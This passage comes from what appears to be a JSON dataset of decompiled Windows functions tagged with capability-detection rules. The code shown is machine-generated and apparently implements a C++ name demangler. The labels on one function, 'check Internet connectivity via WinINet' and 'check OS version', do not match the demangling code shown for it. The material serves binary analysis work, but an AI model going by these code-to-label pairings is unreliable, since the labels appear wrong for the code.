(*param_1[3][3] == 0x3b)) {\n            iVar20 = fcn.00416f30(param_1 + 3);\n            if (iVar20 == 0) {\n                iVar20 = *(param_1[3] + 8);\n                iVar4 = *(*(param_1[3] + 0xc) + 0xc);\n                iVar8 = sub.msvcrt.dll_strcmp(**(param_1[2] + 8), 0x50377f);\n                if (iVar8 == 0) {\n                    fcn.00416e40();\n                    fcn.00416da0();\n                    fcn.00416e40();\n                    fcn.0040e030();\n                    fcn.00416e40();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                }\n                else {\n                    fcn.0040e030();\n                    if (*(iVar20 + 8) != 0) {\n                        fcn.00416e40();\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x20;\n                        in_EAX[0x104] = 0x20;\n                    }\n                    fcn.00411160();\n                    if (iVar4 == 0) {\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                    else {\n                        fcn.00416e40();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                }\n            }\n            else {\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            *(in_EAX + 0x118) = 1;\n            uVar17 = param_1[1] - 1;\n        }\n        break;\n    case 0x3a:\n    case 0x3b:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        break;\n    case 0x3c:\n    case 0x3d:\n        uVar17 = 0;\n        if ((*param_1[2] == 0x27) && (uVar17 = *(param_1[2][2] + 0x10),  uVar17 != 0)) {\n            if (uVar17 < 7) {\n                if (*param_1[3] == 0) {\n                    if (uVar6 == 0x3d) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x2d;\n                        in_EAX[0x104] = 0x2d;\n                    }\n                    fcn.00411160();\n    // switch table (5 cases) at 0x503efc\n                    switch(uVar17) {\n                    case 2:\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x75;\n                        in_EAX[0x104] = 0x75;\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 3:\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x6c;\n                        in_EAX[0x104] = 0x6c;\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 4:\n                        fcn.0040e030();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 5:\n                        fcn.0040e030();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 6:\n                        fcn.0040e030();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    default:\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                    break;\n                }\n            }\n            else if ((((uVar17 == 7) && (piVar5 = param_1[3],  *piVar5 == 0)) && (piVar5[3] == 1)) && (uVar6 == 0x3c)) {\n                if (*piVar5[2] == '0') {\n                    fcn.0040e030();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    break;\n                }\n                if (*piVar5[2] == '1') {\n                    fcn.0040e030();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    break;\n                }\n            }\n        }\n        if (*(in_EAX + 0x100) == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *(in_EAX + 0x100) = 0;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x28;\n        in_EAX[0x104] = 0x28;\n        fcn.00411160();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *in_EAX = 0x29;\n            in_EAX[0x104] = 0x29;\n            uVar6 = *param_1;\n            *(in_EAX + 0x100) = 1;\n            if (uVar6 == 0x3d) goto code_r0x004148ca;\n        }\n        else {\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x29;\n            in_EAX[0x104] = 0x29;\n            if (*param_1 == 0x3d) {\n                if (iVar20 + 1 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\ncode_r0x004148ca:\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x2d;\n                in_EAX[0x104] = 0x2d;\n            }\n        }\n        if (uVar17 == 8) {\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x5b;\n            in_EAX[0x104] = 0x5b;\n            fcn.00411160();\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x5d;\n            in_EAX[0x104] = 0x5d;\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            fcn.00411160();\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x3e:\n        puVar15 = 0x503d33;\n        uVar26 = 0x6a;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d40) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x3f:\n        fcn.00411160();\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x40:\n        uVar6 = param_1[2];\n        iVar4 = *(in_EAX + 0x100);\n        if (iVar4 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            uVar17 = param_1[1];\n            iVar4 = 0;\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            uVar17 = uVar17 - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        *(in_EAX + 0x100) = iVar4 + 1;\n        uStack132._0_1_ = uVar6;\n        in_EAX[iVar4] = uStack132;\n        in_EAX[0x104] = uStack132;\n        break;\n    case 0x41:\n        pppuVar22 = appuStack92;\n        sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, param_1[2]);\n        pppuVar13 = pppuVar22;\n        do {\n            pppuVar25 = pppuVar13;\n            uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n            uVar17 = uVar6 & 0x80808080;\n            pppuVar13 = pppuVar25 + 1;\n        } while (uVar17 == 0);\n        bVar27 = (uVar6 & 0x8080) == 0;\n        if (bVar27) {\n            uVar17 = uVar17 >> 0x10;\n        }\n        if (bVar27) {\n            pppuVar13 = pppuVar25 + 6;\n        }\n        puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n        if (puVar15 != NULL) {\n            pppuVar13 = pppuVar22 + puVar15;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *pppuVar22;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pppuVar22 = pppuVar22 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (pppuVar13 != pppuVar22);\n        }\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x42:\n        puVar15 = 0x503d42;\n        uVar26 = 100;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d4b) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x29;\n        in_EAX[0x104] = 0x29;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x43:\n        puVar15 = 0x503d5d;\n        uVar26 = 0x67;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d79) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x44:\n        puVar15 = 0x503d7b;\n        uVar26 = 0x67;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d96) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x45:\n        puVar15 = 0x503d98;\n        uVar26 = 0x7b;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503d9f) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        puVar15 = 0x503da0;\n        *(in_EAX + 0x120) = *(in_EAX + 0x120) + 1;\n        fcn.00411160();\n        uVar26 = 0x29;\n        *(in_EAX + 0x120) = *(in_EAX + 0x120) + -1;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            puVar15 = puVar15 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503da2) break;\n            uVar26 = *puVar15;\n            iVar20 = iVar4;\n        }\n        pppuVar22 = appuStack92;\n        sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, param_1[3] + 1);\n        pppuVar13 = pppuVar22;\n        do {\n            pppuVar25 = pppuVar13;\n            uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n            uVar17 = uVar6 & 0x80808080;\n            pppuVar13 = pppuVar25 + 1;\n        } while (uVar17 == 0);\n        bVar27 = (uVar6 & 0x8080) == 0;\n        if (bVar27) {\n            uVar17 = uVar17 >> 0x10;\n        }\n        if (bVar27) {\n            pppuVar13 = pppuVar25 + 6;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n        if (puVar15 != NULL) {\n            pppuVar13 = pppuVar22 + puVar15;\n            iVar4 = iVar20;\n            do {\n                uVar26 = *pppuVar22;\n                if (iVar4 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar20 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar20 = iVar4 + 1;\n                }\n                pppuVar22 = pppuVar22 + 1;\n                *(in_EAX + 0x100) = iVar20;\n                in_EAX[iVar4] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar4 = iVar20;\n            } while (pppuVar13 != pppuVar22);\n        }\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7d;\n        in_EAX[0x104] = 0x7d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x47:\n        puVar15 = 0x503da4;\n        uVar26 = 0x7b;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503db1) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        pppuVar22 = appuStack92;\n        sub.msvcrt.dll_sprintf(pppuVar22, 0x503b67, param_1[2] + 1);\n        pppuVar13 = pppuVar22;\n        do {\n            pppuVar25 = pppuVar13;\n            uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n            uVar17 = uVar6 & 0x80808080;\n            pppuVar13 = pppuVar25 + 1;\n        } while (uVar17 == 0);\n        bVar27 = (uVar6 & 0x8080) == 0;\n        if (bVar27) {\n            uVar17 = uVar17 >> 0x10;\n        }\n        if (bVar27) {\n            pppuVar13 = pppuVar25 + 6;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n        if (puVar15 != NULL) {\n            pppuVar13 = pppuVar22 + puVar15;\n            iVar4 = iVar20;\n            do {\n                uVar26 = *pppuVar22;\n                if (iVar4 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar20 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar20 = iVar4 + 1;\n                }\n                pppuVar22 = pppuVar22 + 1;\n                *(in_EAX + 0x100) = iVar20;\n                in_EAX[iVar4] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar4 = iVar20;\n            } while (pppuVar13 != pppuVar22);\n        }\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7d;\n        in_EAX[0x104] = 0x7d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x48:\n        puVar15 = 0x503caa;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503cbf) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x49:\n        puVar15 = 0x503cc1;\n        uVar26 = 0x6e;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503cda) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x4a:\n        piVar5 = fcn.0040e7c0();\n        ppuStack124 = NULL;\n        if (piVar5 == NULL) {\n            fcn.00416e40();\n            fcn.0040e030();\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            do {\n                if ((*piVar5 != 0x2f) || (piVar5[2] == 0)) {\n                    if (ppuStack124 == NULL) {\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        goto code_r0x00411361;\n                    }\n                    break;\n                }\n                piVar5 = piVar5[3];\n                ppuStack124 = ppuStack124 + 1;\n            } while (piVar5 != NULL);\n            do {\n                *(in_EAX + 0x124) = ppuStack128;\n                fcn.00411160();\n                if (ppuStack128 < ppuStack124 + -1) {\n                    puVar15 = 0x503cef;\n                    uVar26 = 0x2c;\n                    iVar20 = *(in_EAX + 0x100);\n                    while( true ) {\n                        if (iVar20 == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            iVar4 = 1;\n                            iVar20 = 0;\n                        }\n                        else {\n                            iVar4 = iVar20 + 1;\n                        }\n                        puVar15 = puVar15 + 1;\n                        *(in_EAX + 0x100) = iVar4;\n                        in_EAX[iVar20] = uVar26;\n                        in_EAX[0x104] = uVar26;\n                        if (puVar15 == 0x503cf1) break;\n                        uVar26 = *puVar15;\n                        iVar20 = iVar4;\n                    }\n                }\n                ppuStack128 = ppuStack128 + 1;\n            } while (ppuStack128 < ppuStack124);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x4b:\n        pcVar16 = \"[abi:\";\n        fcn.00411160();\n        cVar12 = '[';\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            pcVar16 = pcVar16 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = cVar12;\n            in_EAX[0x104] = cVar12;\n            if (pcVar16 == \"\") break;\n            cVar12 = *pcVar16;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x5d;\n        in_EAX[0x104] = 0x5d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x4d:\n        puVar15 = 0x503db3;\n        fcn.00411160();\n        uVar26 = 0x20;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x503dba) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.00411160();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x5d;\n        in_EAX[0x104] = 0x5d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n    }\ncode_r0x00411361:\n    *(in_EAX + 300) = uStack104;\n    param_1[1] = uVar17;\n    *(in_EAX + 0x11c) = iVar20;\n    return;\ncode_r0x00414b38:\n    puVar7 = *ppuStack124;\n    if (puVar7 != 0x4c) {\n        if (puVar7 < 0x4d) {\n            if (0x4 < puVar7 + -7) goto code_r0x00412bad;\n        }\n        else if (1 < puVar7 - 0x4eU) goto code_r0x00412bad;\n    }\n    if (iStack120 == 4) goto code_r0x0041510b;\n    *(in_EAX + 0x114) = pppuVar22;\n    pppuVar13 = pppuVar22 + -4;\n    pppuVar25 = pppuVar22;\n    for (iVar20 = 4; iVar20 != 0; iVar20 = iVar20 + -1) {\n        *pppuVar25 = *pppuVar13;\n        pppuVar13 = pppuVar13 + 1;\n        pppuVar25 = pppuVar25 + 1;\n    }\n    pppuVar22[-2] = NULL;\n    *pppuVar22 = pppuVar22 + -4;\n    pppuVar22[-3] = ppuStack124;\n    pppuVar22[-1] = ppuVar21;\n    iStack120 = iStack120 + 1;\n    ppuStack124 = ppuStack124[2];\n    pppuVar22 = pppuVar22 + 4;\n    goto code_r0x00414b38;\ncode_r0x00412bad:\n    if (*ppuStack124 == 0x4) {\n        *(in_EAX + 0x110) = &ppuStack100;\n        auStack96 = ppuStack124;\n        ppuStack100 = ppuVar21;\n    }\n    fcn.00411160();\n    if (*ppuStack124 == 0x4) {\n        *(in_EAX + 0x110) = ppuStack100;\n    }\n    pppuVar22 = appuStack92 + iStack120 * 4;\n    do {\n        if (pppuVar22[-2] == NULL) {\n            iVar20 = *(in_EAX + 0x100);\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar20 = 0;\n            }\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x20;\n            in_EAX[0x104] = 0x20;\n            fcn.00415af0();\n        }\n        pppuVar22 = pppuVar22 + -4;\n    } while (appuStack92 != pppuVar22);\n    *(in_EAX + 0x114) = uVar2;\ncode_r0x00412c6c:\n    uVar17 = param_1[1] - 1;\n    iVar20 = *(in_EAX + 0x11c) + -1;\n    goto code_r0x00411361;\n}\n",
        "token_count": 32901
    },
    "00416740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416740(int32_t *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uchar uVar7;\n    uchar *puVar8;\n    uint32_t *puVar9;\n    uchar auStack53 [37];\n    \n    if (param_1 != NULL) {\n        iVar3 = *(in_EAX + 0x118);\n        while (iVar3 == 0) {\n            if (param_1[2] == 0) {\n                uVar4 = *param_1[1];\n                if (param_3 != 0) goto code_r0x00416778;\n                if (uVar4 != 0x4c) {\n                    if (uVar4 < 0x4d) {\n                        if (4 < uVar4 - 0x1c) goto code_r0x00416778;\n                    }\n                    else if (1 < uVar4 - 0x4e) {\ncode_r0x00416778:\n                        uVar1 = *(in_EAX + 0x110);\n                        param_1[2] = 1;\n                        *(in_EAX + 0x110) = param_1[3];\n                        if (uVar4 == 0x29) {\n                            fcn.00416410(*param_1);\n                            *(in_EAX + 0x110) = uVar1;\n                            return;\n                        }\n                        if (uVar4 == 0x2a) {\n                            fcn.00416b00(*param_1);\n                            *(in_EAX + 0x110) = uVar1;\n                            return;\n                        }\n                        if (uVar4 == 2) {\n                            uVar2 = *(in_EAX + 0x114);\n                            *(in_EAX + 0x114) = 0;\n                            fcn.00411160();\n                            *(in_EAX + 0x114) = uVar2;\n                            iVar3 = *(in_EAX + 0x100);\n                            if ((param_2 & 4) == 0) {\n                                puVar8 = 0x503b56;\n                                uVar7 = 0x3a;\n                                while( true ) {\n                                    if (iVar3 == 0xff) {\n                                        *(in_EAX + 0xff) = 0;\n                                        (**(in_EAX + 0x108))();\n                                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                        iVar6 = 1;\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        iVar6 = iVar3 + 1;\n                                    }\n                                    puVar8 = puVar8 + 1;\n                                    *(in_EAX + 0x100) = iVar6;\n                                    *(in_EAX + iVar3) = uVar7;\n                                    *(in_EAX + 0x104) = uVar7;\n                                    if (puVar8 == 0x503b58) break;\n                                    uVar7 = *puVar8;\n                                    iVar3 = iVar6;\n                                }\n                            }\n                            else {\n                                iVar6 = iVar3 + 1;\n                                if (iVar3 == 0xff) {\n                                    *(in_EAX + 0xff) = 0;\n                                    (**(in_EAX + 0x108))();\n                                    *(in_EAX + 0x128) = 